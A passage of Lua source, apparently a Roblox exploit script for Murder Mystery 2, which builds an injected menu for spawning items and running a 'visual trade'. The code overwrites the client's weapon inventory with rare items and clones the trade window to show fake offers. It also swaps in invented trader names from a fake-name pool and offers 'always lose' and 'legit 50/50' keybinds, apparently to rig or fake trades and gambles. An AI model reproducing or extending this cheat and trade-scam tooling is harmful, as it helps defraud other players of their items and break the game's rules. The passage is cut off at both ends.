	bTitle.Size = UDim2.new(1, 0, 0, 30)
	bTitle.Position = UDim2.new(0, 0, 0, 5)
	bTitle.Text = "Blocker"
	bTitle.TextColor3 = MM2.TextWhite
	bTitle.TextScaled = true
	bTitle.FontFace = MM2.FontBold
	Utils.textStroke(bTitle, 1.8)

	UI.blockBtn, UI.blockClick, UI.blockLbl = Utils.makeMM2Button("Open Block Menu", blockerSub, UDim2.new(0, 280, 0, 55), UDim2.new(0.5, -140, 0.5, -28), MM2.ActionBlue, MM2.ActionBlueStroke)

	local bDesc = Instance.new("TextLabel", blockerSub)
	bDesc.BorderSizePixel = 0
	bDesc.BackgroundTransparency = 1
	bDesc.Size = UDim2.new(0.9, 0, 0, 45)
	bDesc.Position = UDim2.new(0.05, 0, 1, -60)
	bDesc.Text = "Opens the player block panel. Click any player to block them."
	bDesc.TextColor3 = MM2.TextWhite
	bDesc.TextScaled = true
	bDesc.FontFace = MM2.FontFred
	bDesc.TextWrapped = true
	Utils.textStroke(bDesc, 1.3)

	local function showSubTab(name)
		visualsSub.Visible = (name == "Visuals")
		wheelSub.Visible = (name == "Wheel")
		blockerSub.Visible = (name == "Blocker")
		UI.mTabVisuals.BackgroundColor3 = name == "Visuals" and MM2.TabActive or MM2.TabInactive
		UI.mTabWheel.BackgroundColor3 = name == "Wheel" and MM2.TabActive or MM2.TabInactive
		UI.mTabBlocker.BackgroundColor3 = name == "Blocker" and MM2.TabActive or MM2.TabInactive
	end
	UI.mTabVisualsBtn.MouseButton1Click:Connect(function() showSubTab("Visuals") end)
	UI.mTabWheelBtn.MouseButton1Click:Connect(function() showSubTab("Wheel") end)
	UI.mTabBlockerBtn.MouseButton1Click:Connect(function() showSubTab("Blocker") end)
	showSubTab("Visuals")

	local settingsPage = Instance.new("Frame", mainArea)
	settingsPage.BorderSizePixel = 0
	settingsPage.BackgroundTransparency = 1
	settingsPage.Size = UDim2.new(1, 0, 1, 0)
	settingsPage.Visible = false
	UI.settingsPage = settingsPage

	local si = Instance.new("TextLabel", settingsPage)
	si.BorderSizePixel = 0
	si.BackgroundTransparency = 1
	si.Size = UDim2.new(0.9, 0, 0, 25)
	si.Position = UDim2.new(0.05, 0, 0.02, 0)
	si.Text = "Global Settings"
	si.TextColor3 = MM2.TextWhite
	si.TextScaled = true
	si.FontFace = MM2.FontBold
	Utils.textStroke(si, 1.8)

	UI.equipToggleBtn, UI.equipToggleClick, UI.equipToggleLbl = Utils.makeMM2Button("Equip Weapons: OFF", settingsPage, UDim2.new(0, 260, 0, 50), UDim2.new(0.5, -130, 0, 60), MM2.ItemBG, MM2.TabStroke)
	UI.debugKeyBtn, UI.debugKeyClick, UI.debugKeyLbl = Utils.makeMM2Button("K debug", settingsPage, UDim2.new(0, 200, 0, 45), UDim2.new(0.5, -100, 0, 130), MM2.ItemBG, MM2.TabStroke)
	UI.mToggleBtn, UI.mToggleClick, UI.mToggleLbl = Utils.makeMM2Button("M toggle menu", settingsPage, UDim2.new(0, 240, 0, 45), UDim2.new(0.5, -120, 0, 180), MM2.ItemBG, MM2.TabStroke)

	local sdInfo = Instance.new("TextLabel", settingsPage)
	sdInfo.BorderSizePixel = 0
	sdInfo.BackgroundTransparency = 1
	sdInfo.Size = UDim2.new(0.9, 0, 0, 22)
	sdInfo.Position = UDim2.new(0.05, 0, 0, 245)
	sdInfo.Text = "Data Management"
	sdInfo.TextColor3 = MM2.TextWhite
	sdInfo.TextScaled = true
	sdInfo.FontFace = MM2.FontFred
	Utils.textStroke(sdInfo, 1.3)

	UI.saveBtn, UI.saveClick, UI.saveLbl = Utils.makeMM2Button("Save Data", settingsPage, UDim2.new(0, 200, 0, 55), UDim2.new(0.05, 0, 0, 275), MM2.GreenAction, MM2.GreenActionStroke)
	UI.wipeBtn, UI.wipeClick, UI.wipeLbl = Utils.makeMM2Button("Wipe Data", settingsPage, UDim2.new(0, 200, 0, 55), UDim2.new(0.5, 0, 0, 275), MM2.CloseRed, MM2.CloseRedStroke)

	Utils.makeDraggable(titleBar, main)

	local function showTab(tabName)
		spawnerPage.Visible = (tabName == "Spawner")
		methodsPage.Visible = (tabName == "Methods")
		settingsPage.Visible = (tabName == "Settings")
		UI.tab1.BackgroundColor3 = tabName == "Spawner" and MM2.TabActive or MM2.TabInactive
		UI.tab2.BackgroundColor3 = tabName == "Methods" and MM2.TabActive or MM2.TabInactive
		UI.tab3.BackgroundColor3 = tabName == "Settings" and MM2.TabActive or MM2.TabInactive
	end
	UI.showTab = showTab
	UI.tab1Btn.MouseButton1Click:Connect(function() showTab("Spawner") end)
	UI.tab2Btn.MouseButton1Click:Connect(function() showTab("Methods") end)
	UI.tab3Btn.MouseButton1Click:Connect(function() showTab("Settings") end)
	showTab("Spawner")
end

local Core = {}
Core.itemDatabase = nil
Core.allSpawnerClones = {}
Core.equipEnabled = false
Core.visualTradeEnabled = false
Core.tradeSessionActive = false
Core.giveAllIgnored = {
	["???"] = true, ["Red Raygun"] = true, ["Bronze Raygun"] = true, ["Silver Raygun"] = true,
	["Gold Raygun"] = true, ["Nik's Scythe"] = true, ["Icecrusher"] = true, ["Synthwave"] = true,
	["Reaver"] = true, ["Gingerscythe"] = true,
}
Core.rarityOrder = {
	Unique = 1, Ancient = 2, Godly = 3, Legendary = 4, Rare = 5,
	Uncommon = 6, Common = 7, Vintage = 8, Classic = 9, Christmas = 10, Halloween = 11,
}
Core.rarityStrokes = {
	Godly = Color3.fromRGB(255, 0, 179), Ancient = Color3.fromRGB(100, 10, 255),
	Unique = Color3.fromRGB(240, 140, 0), Legendary = Color3.fromRGB(200, 0, 200),
	Rare = Color3.fromRGB(0, 100, 255), Uncommon = Color3.fromRGB(0, 200, 0),
	Common = Color3.fromRGB(180, 180, 180), Classic = Color3.fromRGB(180, 180, 60),
	Christmas = Color3.fromRGB(0, 180, 0), Halloween = Color3.fromRGB(255, 120, 0),
}
Core.rarityColors = {
	Common = Color3.fromRGB(180, 180, 180), Uncommon = Color3.fromRGB(0, 200, 0),
	Rare = Color3.fromRGB(0, 100, 255), Legendary = Color3.fromRGB(200, 0, 200),
	Classic = Color3.fromRGB(180, 180, 60), Christmas = Color3.fromRGB(0, 180, 0),
	Halloween = Color3.fromRGB(255, 120, 0), Godly = Color3.fromRGB(255, 0, 179),
	Unique = Color3.fromRGB(240, 140, 0), Ancient = Color3.fromRGB(100, 10, 255),
}

function Core.loadDatabase()
	local ok, res = pcall(function() return require(ReplicatedStorage.Database.Sync.Item) end)
	if ok and type(res) == "table" then Core.itemDatabase = res; return true end
	return false
end

function Core.getItemDataByName(name)
	if not Core.itemDatabase then Core.loadDatabase() end
	if not Core.itemDatabase then return nil end
	local direct = Core.itemDatabase[name]
	if direct then return direct end
	for _, data in pairs(Core.itemDatabase) do
		if data and data.ItemName == name then return data end
	end
	return nil
end

function Core.spawnWeapon(name, quantity)
	quantity = quantity or 1
	if quantity < 1 then quantity = 1 end
	pcall(function()
		local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
		local PW = PlayerData.Weapons
		PW.Owned[name] = (PW.Owned[name] or 0) + quantity
		RunService:BindToRenderStep("IU_" .. name .. "_" .. tick(), 0, function() PlayerData.Weapons = PW end)
		if localPlayer.Character then localPlayer.Character:BreakJoints() end
	end)
end

function Core.populateSpawner()
	if not Core.itemDatabase then if not Core.loadDatabase() then return end end
	for _, ch in ipairs(UI.itemGrid:GetChildren()) do
		if ch:IsA("ImageButton") and ch.Name ~= "Template" then ch:Destroy() end
	end
	Core.allSpawnerClones = {}
	local sorted = {}
	pcall(function()
		for key, data in pairs(Core.itemDatabase) do
			if data and type(data) == "table" and type(data.ItemName) == "string" and type(data.Image) == "string" then
				table.insert(sorted, {key = key, data = data})
			end
		end
	end)
	table.sort(sorted, function(a, b)
		if not a.data or not b.data then return false end
		local rA = Core.rarityOrder[a.data.Rarity] or 99
		local rB = Core.rarityOrder[b.data.Rarity] or 99
		if rA ~= rB then return rA < rB end
		return tostring(a.data.ItemName) < tostring(b.data.ItemName)
	end)
	for i, entry in ipairs(sorted) do
		local d, k = entry.data, entry.key
		if d then
			local clone = UI.itemTemplate:Clone()
			clone.Name = tostring(k)
			clone.Visible = true
			clone.LayoutOrder = i
			clone.Parent = UI.itemGrid
			local nl = clone:FindFirstChild("ItemName")
			local ic = clone:FindFirstChild("Icon")
			local def = clone:FindFirstChild("Default")
			if nl then nl.Text = d.ItemName or "???" end
			if ic then ic.Image = d.Image or "" end
			if def then
				local os = def:FindFirstChildOfClass("UIStroke")
				if os then
					os.Color = Core.rarityStrokes[d.Rarity] or Color3.fromRGB(120, 120, 120)
					os.Transparency = 0.35
				end
			end
			clone.MouseButton1Click:Connect(function() Core.spawnWeapon(k, 1) end)
			table.insert(Core.allSpawnerClones, {clone = clone, name = tostring(d.ItemName):lower(), key = k})
		end
	end
end

UI.searchBox:GetPropertyChangedSignal("Text"):Connect(function()
	local q = UI.searchBox.Text:lower()
	for _, e in ipairs(Core.allSpawnerClones) do
		e.clone.Visible = (q == "" or e.name:find(q, 1, true) ~= nil)
	end
end)

UI.giveAllClick.MouseButton1Click:Connect(function()
	if not Core.itemDatabase then Core.loadDatabase() end
	if not Core.itemDatabase then return end
	pcall(function()
		local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
		local PW = PlayerData.Weapons
		PW.Owned = {}
		PW.Owned["DefaultKnife"] = 1
		PW.Owned["DefaultGun"] = 1
		local maxAmt = tonumber(UI.maxQtyBox.Text) or 299
		if maxAmt < 1 then maxAmt = 1 end
		local minAmt = math.max(1, math.floor(maxAmt * 0.3))
		for key, data in pairs(Core.itemDatabase) do
			if data and type(data) == "table" and data.ItemName then
				local skip = false
				if Core.giveAllIgnored[data.ItemName] then skip = true end
				if data.Rarity == "Unique" and data.ItemName ~= "Sorry" then skip = true end
				if key == "DefaultKnife" or key == "DefaultGun" then skip = true end
				if not skip then
					local qty = math.random(minAmt, maxAmt)
					PW.Owned[key] = qty
				end
			end
		end
		RunService:BindToRenderStep("IUGA_" .. tick(), 0, function() PlayerData.Weapons = PW end)
		task.delay(1, function()
			if localPlayer.Character then
				pcall(function() localPlayer.Character:BreakJoints() end)
			end
		end)
	end)
end)

UI.saveClick.MouseButton1Click:Connect(function()
	pcall(function()
		local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
		RunService:BindToRenderStep("SDT", 0, function() PlayerData.Weapons = PlayerData.Weapons end)
		task.wait(0.5)
		pcall(function() RunService:UnbindFromRenderStep("SDT") end)
	end)
end)

UI.wipeClick.MouseButton1Click:Connect(function()
	pcall(function()
		local PlayerData = require(ReplicatedStorage.Modules.ProfileData)
		PlayerData.Weapons.Owned = {}
		RunService:BindToRenderStep("WDT_" .. tick(), 0, function() PlayerData.Weapons = PlayerData.Weapons end)
		if localPlayer.Character then localPlayer.Character:BreakJoints() end
	end)
end)

local function updateEquipUI()
	if Core.equipEnabled then
		UI.equipToggleLbl.Text = "Equip Weapons: ON"
		UI.equipToggleBtn.BackgroundColor3 = MM2.GreenAction
	else
		UI.equipToggleLbl.Text = "Equip Weapons: OFF"
		UI.equipToggleBtn.BackgroundColor3 = MM2.ItemBG
	end
end
updateEquipUI()
UI.equipToggleClick.MouseButton1Click:Connect(function()
	Core.equipEnabled = not Core.equipEnabled
	updateEquipUI()
end)

local function updateVisualUI()
	if Core.visualTradeEnabled then
		UI.visualLbl.Text = "Visual Trade: ON"
		UI.visualBtn.BackgroundColor3 = MM2.GreenAction
	else
		UI.visualLbl.Text = "Visual Trade: OFF"
		UI.visualBtn.BackgroundColor3 = MM2.ItemBG
	end
end
updateVisualUI()
UI.visualClick.MouseButton1Click:Connect(function()
	Core.visualTradeEnabled = not Core.visualTradeEnabled
	updateVisualUI()
end)

Core.keybinds = {
	give = Enum.KeyCode.Q,
	get = Enum.KeyCode.T,
	toggle = Enum.KeyCode.M,
	debug = Enum.KeyCode.K,
	alwaysLose = Enum.KeyCode.X,
	legit5050 = Enum.KeyCode.B,
}
Core.waitingForKey = nil

local function updateKB()
	UI.qGiveLbl.Text = Core.keybinds.give.Name .. " to give"
	UI.tGetLbl.Text = Core.keybinds.get.Name .. " to get"
	UI.mToggleLbl.Text = Core.keybinds.toggle.Name .. " toggle menu"
	UI.alwaysLoseLbl.Text = Core.keybinds.alwaysLose.Name .. " always lose"
	UI.legit5050Lbl.Text = Core.keybinds.legit5050.Name .. " legit 50/50"
	UI.debugKeyLbl.Text = Core.keybinds.debug.Name .. " debug"
end
updateKB()

UI.qGiveClick.MouseButton1Click:Connect(function() Core.waitingForKey = "give"; UI.qGiveLbl.Text = "Press a key..." end)
UI.tGetClick.MouseButton1Click:Connect(function() Core.waitingForKey = "get"; UI.tGetLbl.Text = "Press a key..." end)
UI.mToggleClick.MouseButton1Click:Connect(function() Core.waitingForKey = "toggle"; UI.mToggleLbl.Text = "Press a key..." end)
UI.alwaysLoseClick.MouseButton1Click:Connect(function() Core.waitingForKey = "alwaysLose"; UI.alwaysLoseLbl.Text = "Press a key..." end)
UI.legit5050Click.MouseButton1Click:Connect(function() Core.waitingForKey = "legit5050"; UI.legit5050Lbl.Text = "Press a key..." end)
UI.debugKeyClick.MouseButton1Click:Connect(function() Core.waitingForKey = "debug"; UI.debugKeyLbl.Text = "Press a key..." end)

local function toggleUI() UI.main.Visible = not UI.main.Visible end

local Trade = {}
Trade.enabled = false
Trade.scriptAlive = true
Trade.inSession = false
Trade.isIncoming = false
Trade.connections = {}
Trade.offerConnections = {}
Trade.propertyConnections = {}
Trade.sourcePropConnections = {}
Trade.confirmC = nil
Trade.cancelC = nil
Trade.declineC = nil
Trade.claimC = nil
Trade.searchConn = nil
Trade.theirThread = nil
Trade.offerState = {NewItem1 = nil, NewItem2 = nil, NewItem3 = nil, NewItem4 = nil}
Trade.theirState = {NewItem1 = nil, NewItem2 = nil, NewItem3 = nil, NewItem4 = nil}
Trade.sourceState = {}
Trade.lastClick = 0
Trade.cdActive = false
Trade.cdThread = nil
Trade.cdValue = 0
Trade.areYouSure = false
Trade.tradeAccepted = false
Trade.theyAccepted = false
Trade.claimQueue = {}
Trade.claimIndex = 0
Trade.claimTotal = 0
Trade.currentUsername = nil
Trade.lastSessionType = nil
Trade.lastRealTradeUsername = nil
Trade.stickyUsername = nil
Trade.ignoredNames = {["???"] = true}
Trade.allowedItems = {}

local FAKE_NAME_POOL = {
	"xR3dacted", "v0idwalker", "ZephyrKn1fe", "TrexSlayer99", "NovaCrypt",
	"blxze_mm2", "GhostMurder", "SilentReaper", "Kr4ken_v2", "neon_dagger",
	"Xyloph4ge", "murdr_bot", "ShadowStab3r", "l0stKnifer", "CrimsonEdge_",
	"vortex_blade", "SkullDugg3r", "mm2phantom", "DarkBl4de", "eclipseknife",
	"wraithboi99", "SerpentCut", "f4ntomknife", "IcyMurder_", "ByteSlasher",
	"NullEdge_v3", "pl4smablade", "knifekr4fted", "VenomSlice_", "staticknife"
}

function Trade.pickUsername()
	return FAKE_NAME_POOL[math.random(1, #FAKE_NAME_POOL)]
end

function Trade.getSmartUsername(isIncoming)
	if isIncoming then
		if Trade.lastRealTradeUsername and Trade.lastRealTradeUsername ~= "" then
			local name = Trade.lastRealTradeUsername
			Trade.lastRealTradeUsername = nil
			Trade.stickyUsername = name
			return name
		end
		Trade.stickyUsername = nil
		return Trade.pickUsername()
	else
		if Trade.stickyUsername and Trade.stickyUsername ~= "" then
			return Trade.stickyUsername
		end
		return Trade.pickUsername()
	end
end

local function getActiveTradeGUI()
	if autoTraderActive and clonedTradeGUI and clonedTradeGUI.Parent then return clonedTradeGUI end
	return playerGui:FindFirstChild("TradeGUI")
end

function Trade.setTheirUsername(name)
	local t = getActiveTradeGUI(); if not t then return end
	local c = t:FindFirstChild("Container"); if not c then return end
	local tr = c:FindFirstChild("Trade"); if not tr then return end
	local to = tr:FindFirstChild("TheirOffer"); if not to then return end
	local ul = to:FindFirstChild("Username")
	if ul and ul:IsA("TextLabel") then ul.Text = "(" .. name .. ")" end
end

function Trade.isIgnored(n)
	if Trade.ignoredNames[n] then return true end
	if Core.giveAllIgnored[n] then return true end
	return false
end

function Trade.loadTradeDB()
	if not Core.itemDatabase then Core.loadDatabase() end
	if not Core.itemDatabase then return false end
	Trade.allowedItems = {}
	pcall(function()
		for key, data in pairs(Core.itemDatabase) do
			if data and type(data) == "table" and type(data.Rarity) == "string" and type(data.ItemName) == "string" and type(data.Image) == "string" then
				if not Trade.isIgnored(data.ItemName) then
					local inc = false
					if data.Rarity == "Godly" or data.Rarity == "Ancient" then inc = true
					elseif data.Rarity == "Unique" and data.ItemName == "Sorry" then inc = true end
					if inc then table.insert(Trade.allowedItems, {key = key, data = data}) end
				end
			end
		end
	end)
	return true
end

function Trade.getOfferC()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local tr = c:FindFirstChild("Trade"); if not tr then return nil end
	local yo = tr:FindFirstChild("YourOffer"); if not yo then return nil end
	return yo:FindFirstChild("Container")
end

function Trade.getTheirC()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local tr = c:FindFirstChild("Trade"); if not tr then return nil end
	local to = tr:FindFirstChild("TheirOffer"); if not to then return nil end
	return to:FindFirstChild("Container")
end

function Trade.getWeaponC()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local i = c:FindFirstChild("Items"); if not i then return nil end
	local m = i:FindFirstChild("Main"); if not m then return nil end
	local w = m:FindFirstChild("Weapons"); if not w then return nil end
	local it = w:FindFirstChild("Items"); if not it then return nil end
	local ca = it:FindFirstChild("Container"); if not ca then return nil end
	local cu = ca:FindFirstChild("Current"); if not cu then return nil end
	return cu:FindFirstChild("Container")
end

function Trade.getActionsF()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local tr = c:FindFirstChild("Trade"); if not tr then return nil end
	return tr:FindFirstChild("Actions")
end

function Trade.getAcceptF() local a = Trade.getActionsF(); return a and a:FindFirstChild("Accept") end
function Trade.getDeclineF() local a = Trade.getActionsF(); return a and a:FindFirstChild("Decline") end
function Trade.getAddItemF() local a = Trade.getAcceptF(); return a and a:FindFirstChild("AddItem") end
function Trade.getCooldownF() local a = Trade.getAcceptF(); return a and a:FindFirstChild("Cooldown") end
function Trade.getConfirmF() local a = Trade.getAcceptF(); return a and a:FindFirstChild("Confirm") end
function Trade.getCancelF() local a = Trade.getAcceptF(); return a and a:FindFirstChild("Cancel") end

function Trade.getYourAcc()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local tr = c:FindFirstChild("Trade"); if not tr then return nil end
	local yo = tr:FindFirstChild("YourOffer"); if not yo then return nil end
	return yo:FindFirstChild("Accepted")
end

function Trade.getTheirAcc()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local tr = c:FindFirstChild("Trade"); if not tr then return nil end
	local to = tr:FindFirstChild("TheirOffer"); if not to then return nil end
	return to:FindFirstChild("Accepted")
end

function Trade.getClaimNI()
	local m = playerGui:FindFirstChild("MainGUI"); if not m then return nil end
	local g = m:FindFirstChild("Game"); if not g then return nil end
	return g:FindFirstChild("NewItem")
end

function Trade.getSearchBox()
	local t = getActiveTradeGUI(); if not t then return nil end
	local c = t:FindFirstChild("Container"); if not c then return nil end
	local i = c:FindFirstChild("Items"); if not i then return nil end
	local tabs = i:FindFirstChild("Tabs"); if not tabs then return nil end
	local search = tabs:FindFirstChild("Search"); if not search then return nil end
	local cont = search:FindFirstChild("Container"); if not cont then return nil end
	return cont:FindFirstChild("SearchText")
end

function Trade.clearSearchBox()
	local box = Trade.getSearchBox()
	if box then pcall(function() box.Text = "" end) end
end

function Trade.getSourceItemName(sourceItem)
	if not sourceItem then return "" end
	local itemName = sourceItem:FindFirstChild("ItemName")
	if not itemName then return "" end
	local label = itemName:FindFirstChild("Label")
	if not label then return "" end
	return tostring(label.Text or "")
end

function Trade.getSearchQuery()
	local box = Trade.getSearchBox()
	if not box then return "" end
	return tostring(box.Text or ""):lower()
end

function Trade.sourceShouldBeVisible(sourceItem, currentAmount)
	if currentAmount <= 0 then return false end
	local q = Trade.getSearchQuery()
	if q == "" then return true end
	local n = Trade.getSourceItemName(sourceItem):lower()
	return n:find(q, 1, true) ~= nil
end

function Trade.applySourceState(itemName)
	local st = Trade.sourceState[itemName]
	if not st or not st.sourceRef or not st.sourceRef.Parent then return end
	local src = st.sourceRef
	local sc = src:FindFirstChild("Container")
	if sc then
		local sa = sc:FindFirstChild("Amount")
		if sa and sa:IsA("TextLabel") then
			sa.Text = Trade.fmtSource(st.currentAmount)
		end
	end
	src.Visible = Trade.sourceShouldBeVisible(src, st.currentAmount)
end

function Trade.refreshSearchResults()
	for itemName in pairs(Trade.sourceState) do
		Trade.applySourceState(itemName)
	end
end

function Trade.connectSearch()
	if Trade.searchConn then Trade.searchConn:Disconnect(); Trade.searchConn = nil end
	local box = Trade.getSearchBox()
	if not box then return end
	Trade.searchConn = box:GetPropertyChangedSignal("Text"):Connect(function()
		task.wait()
		Trade.refreshSearchResults()
	end)
	Trade.refreshSearchResults()
end

function Trade.setTheirSlotsTrans()
	local tc = Trade.getTheirC(); if not tc then return end
	for i = 1, 4 do
		local s = tc:FindFirstChild("NewItem" .. i)
		if s then pcall(function() s.BackgroundTransparency = 1 end) end
	end
end

function Trade.parseAmount(text)
	if text == nil then return 0 end
	local t = tostring(text):match("^%s*(.-)%s*$")
	if t == "" or t == "..." or t == ".." or t == "." then return 1 end
	local n = t:match("x(%d+)")
	if n then return tonumber(n) end
	n = tonumber(t); if n then return n end
	return 1
end

function Trade.fmtOffer(c) if c <= 1 then return " " else return "x" .. tostring(c) end end
function Trade.fmtSource(c) if c <= 1 then return "" else return "x" .. tostring(c) end end
function Trade.offerHas() for i = 1, 4 do if Trade.offerState["NewItem" .. i] ~= nil then return true end end; return false end
function Trade.theirHas() for i = 1, 4 do if Trade.theirState["NewItem" .. i] ~= nil then return true end end; return false end

function Trade.setConfirmText(text)
	local cf = Trade.getConfirmF(); if not cf then return end
	local tl = cf:FindFirstChild("TextLabel")
	if tl and tl:IsA("TextLabel") then tl.Text = tostring(text) end
end

function Trade.resetConfirm()
	Trade.areYouSure = false; Trade.tradeAccepted = false; Trade.setConfirmText("Accept")
	local c = Trade.getCancelF(); if c then c.Visible = false end
end

function Trade.stopCooldown()
	Trade.cdActive = false
	if Trade.cdThread then task.cancel(Trade.cdThread); Trade.cdThread = nil end
end

function Trade.startCooldown()
	Trade.stopCooldown(); Trade.cdActive = true; Trade.cdValue = 6; Trade.resetConfirm()
	local cf = Trade.getCooldownF(); if not cf then return end
	cf.Visible = true
	local con = Trade.getConfirmF(); if con then con.Visible = false end
	local ca = Trade.getCancelF(); if ca then ca.Visible = false end
	local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
	local tl
	for _, ch in ipairs(cf:GetDescendants()) do if ch:IsA("TextLabel") then tl = ch; break end end
	Trade.cdThread = task.spawn(function()
		while Trade.cdActive and Trade.cdValue > 0 do
			if tl then tl.Text = "Please wait (" .. Trade.cdValue .. ") before accepting." end
			task.wait(1); Trade.cdValue = Trade.cdValue - 1
		end
		if Trade.cdActive then
			local c1 = Trade.getCooldownF(); if c1 then c1.Visible = false end
			local c2 = Trade.getConfirmF(); if c2 then c2.Visible = true end
			local c3 = Trade.getCancelF(); if c3 then c3.Visible = false end
			Trade.setConfirmText("Accept"); Trade.areYouSure = false; Trade.tradeAccepted = false; Trade.cdActive = false
		end
	end)
end

function Trade.updateAcceptUI()
	local ai = Trade.getAddItemF(); local cd = Trade.getCooldownF(); local cf = Trade.getConfirmF(); local ca = Trade.getCancelF()
	local has = Trade.offerHas()
	if Trade.isIncoming then has = has or Trade.theirHas() end
	if has then
		if ai then ai.Visible = false end
		Trade.startCooldown()
	else
		Trade.stopCooldown()
		if ai then ai.Visible = true end
		if cd then cd.Visible = false end
		if cf then cf.Visible = false end
		if ca then ca.Visible = false end
		local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
		local ta = Trade.getTheirAcc(); if ta then ta.Visible = false end
		Trade.resetConfirm()
	end
end

function Trade.updateSource(itemName)
	Trade.applySourceState(itemName)
end

function Trade.applySlot(sn)
	local oc = Trade.getOfferC(); if not oc then return end
	local slot = oc:FindFirstChild(sn); if not slot then return end
	local st = Trade.offerState[sn]
	local sc = slot:FindFirstChild("Container"); local sin = slot:FindFirstChild("ItemName")
	if not sc or not sin then return end
	local icon = sc:FindFirstChild("Icon"); local amt = sc:FindFirstChild("Amount"); local nl = sin:FindFirstChild("Label")
	if st == nil then
		if icon then icon.Image = "" end; if amt then amt.Text = "..." end; if nl then nl.Text = " " end
		slot.Visible = false
	else
		if icon then icon.Image = st.icon or "" end
		if amt then amt.Text = Trade.fmtOffer(st.amount) end
		if nl then nl.Text = tostring(st.displayName or st.name) end
		if st.color then pcall(function() sin.BackgroundColor3 = st.color; sin.BackgroundTransparency = st.transparency or 0 end) end
		local tags = slot:FindFirstChild("Tags")
		if tags then
			local fx = tags:FindFirstChild("FX"); if fx then fx.Visible = st.isFX or false end
			local chroma = tags:FindFirstChild("Chroma"); if chroma then chroma.Visible = st.isChroma or false end
		end
		slot.Visible = true
	end
end

function Trade.applyTheirSlot(sn)
	local tc = Trade.getTheirC(); if not tc then return end
	local slot = tc:FindFirstChild(sn); if not slot then return end
	local st = Trade.theirState[sn]
	local sc = slot:FindFirstChild("Container"); local sin = slot:FindFirstChild("ItemName")
	if not sc or not sin then return end
	local icon = sc:FindFirstChild("Icon"); local amt = sc:FindFirstChild("Amount"); local nl = sin:FindFirstChild("Label")
	if st == nil then
		if icon then icon.Image = "" end; if amt then amt.Text = "..." end; if nl then nl.Text = " " end
		slot.Visible = false
	else
		if icon then icon.Image = st.icon or "" end
		if amt then amt.Text = Trade.fmtOffer(st.amount) end
		if nl then nl.Text = tostring(st.displayName or st.name) end
		if st.color then pcall(function() sin.BackgroundColor3 = st.color; sin.BackgroundTransparency = 0 end) end
		local tags = slot:FindFirstChild("Tags")
		if tags then
			local fx = tags:FindFirstChild("FX"); if fx then fx.Visible = st.isFX or false end
			local chroma = tags:FindFirstChild("Chroma"); if chroma then chroma.Visible = st.isChroma or false end
		end
		slot.Visible = true
		pcall(function() if slot:IsA("Frame") then slot.BackgroundTransparency = 1 end end)
	end
end

function Trade.enforceSlot(sn) if not Trade.scriptAlive or not Trade.enabled then return end; Trade.applySlot(sn) end
function Trade.enforceTheirSlot(sn) if not Trade.scriptAlive or not Trade.enabled then return end; Trade.applyTheirSlot(sn) end

function Trade.registerSource(sni)
	local sc = sni:FindFirstChild("Container"); local sin = sni:FindFirstChild("ItemName")
	if not sc or not sin then return end
	local snl = sin:FindFirstChild("Label"); local sa = sc:FindFirstChild("Amount")
	if not snl then return end
	local iName = tostring(snl.Text); if iName == "" or iName == " " then return end
	if not Trade.sourceState[iName] then
		local amt = 1
		if sa and sa:IsA("TextLabel") then amt = Trade.parseAmount(sa.Text) end
		Trade.sourceState[iName] = {originalAmount = amt, currentAmount = amt, sourceRef = sni}
	else
		Trade.sourceState[iName].sourceRef = sni
	end
end

function Trade.restoreAllSources()
	for i = 1, 4 do
		local sn = "NewItem" .. i; local st = Trade.offerState[sn]
		if st then
			local realName = st.displayName or st.name
			local sd = Trade.sourceState[realName]
			if sd then sd.currentAmount = sd.currentAmount + st.amount; Trade.updateSource(realName) end
		end
	end
end

function Trade.addToInventory(itemData, quantity)
	if not itemData then return end
	quantity = quantity or 1
	local iName = tostring(itemData.ItemName)
	local color = Core.rarityColors[itemData.Rarity] or Color3.fromRGB(180, 180, 180)
	local wc = Trade.getWeaponC(); if not wc then return end
	local existing = nil
	for _, ch in ipairs(wc:GetChildren()) do
		if ch.Name == "NewItem" then
			local ci = ch:FindFirstChild("ItemName")
			if ci then local lbl = ci:FindFirstChild("Label"); if lbl and lbl.Text == iName then existing = ch; break end end
		end
	end
	if existing then
		local sd = Trade.sourceState[iName]
		if sd then sd.currentAmount = sd.currentAmount + quantity; Trade.updateSource(iName)
		else Trade.registerSource(existing); sd = Trade.sourceState[iName]; if sd then sd.currentAmount = sd.currentAmount + quantity; Trade.updateSource(iName) end end
	else
		local template = nil
		for _, ch in ipairs(wc:GetChildren()) do if ch.Name == "NewItem" then template = ch; break end end
		if template then
			local ni = template:Clone(); ni.Parent = wc; ni.Visible = true
			local nc2 = ni:FindFirstChild("Container"); local nin = ni:FindFirstChild("ItemName")
			if nc2 and nin then
				local icon = nc2:FindFirstChild("Icon"); local amt = nc2:FindFirstChild("Amount"); local lbl = nin:FindFirstChild("Label")
				if icon then icon.Image = itemData.Image or "" end
				if amt and amt:IsA("TextLabel") then amt.Text = Trade.fmtSource(quantity) end
				if lbl then lbl.Text = iName end
				pcall(function() nin.BackgroundColor3 = color end)
			end
			Trade.sourceState[iName] = {originalAmount = quantity, currentAmount = quantity, sourceRef = ni}
			Trade.applySourceState(iName)
			if nc2 then
				local ab = nc2:FindFirstChild("ActionButton")
				if ab and ab:IsA("TextButton") then
					local conn = ab.MouseButton1Click:Connect(function() if _G.handleSourceActionClickRef then _G.handleSourceActionClickRef(ni) end end)
					table.insert(Trade.connections, conn)
				end
			end
		end
	end
end

function Trade.setupWatchers()
	for _, c in ipairs(Trade.propertyConnections) do c:Disconnect() end
	Trade.propertyConnections = {}
	local oc = Trade.getOfferC()
	if oc then
		for i = 1, 4 do
			local sn = "NewItem" .. i; local slot = oc:FindFirstChild(sn)
			if slot then
				table.insert(Trade.propertyConnections, slot:GetPropertyChangedSignal("Visible"):Connect(function()
